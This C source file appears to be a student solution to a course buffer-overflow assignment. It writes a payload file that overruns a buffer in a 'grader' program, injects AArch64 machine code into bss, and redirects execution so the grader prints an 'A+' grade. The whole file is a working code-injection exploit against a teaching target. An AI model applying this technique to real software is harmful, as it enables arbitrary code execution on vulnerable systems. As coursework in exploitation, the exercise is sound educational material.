/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Alex Luo, Rohan Amin                                       */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

/* This function takes no command-line arguments and does not read from 
   any streams. It writes to a file dataAplus, creating a file that, 
   when piped to the grader program, will cause the grader program to 
   recommend a "A+" grade for "Rohan Alex". It then returns 0. */

int main(void) {
   FILE *psFile;
   int i;
   unsigned int mov, adr, branch, bl, strb;
   unsigned long movLocation;
   psFile = fopen("dataAplus", "w");

   /* Puts truncated name in the buf array */ 
   fputs("Rolex",psFile);   
   putc('\0', psFile);

   /* Puts A in buf array to be printed */ 
   putc('A', psFile); 

   /* Filler in the buf array with null bytes */ 
   for (i = 0; i < 17; i++)
      putc('\0', psFile);    

   /* Machine code instructions to printf with A as parameter:
         adr x0, 0x42005e (location of 'A' in bss above)
         bl 0x400600 (printf)
       */ 
   adr = MiniAssembler_adr(0, 0x42005e, 0x420070);
   bl = MiniAssembler_bl(0x400600, 0x420074);
   
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&bl, sizeof(unsigned int), 1, psFile);

   /* Machine code instructions to fill printf parameters with + as  
      grade (A already printed from previous instructions). This then 
      branches to a printf call in the grader main function. :
         mov x0, '+'
         adr x1, 0x420044 (grade variable)
         str x0, [x1]
         b 0x400864 (printf call)
   */
   mov = MiniAssembler_mov(0, '+');
   adr = MiniAssembler_adr(1,0x420044,0x42007c) ;
   strb = MiniAssembler_strb(0, 1); 
   branch = MiniAssembler_b(0x400864,0x420084);

   /* Location of beginning of machine code instructions in bss. */
   movLocation = 0x420070;
   
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&strb, sizeof(unsigned int), 1, psFile);
   fwrite(&branch, sizeof(unsigned int), 1, psFile);
   fwrite (&movLocation, sizeof(unsigned long), 1, psFile);    

   fclose(psFile);
   return 0;

}
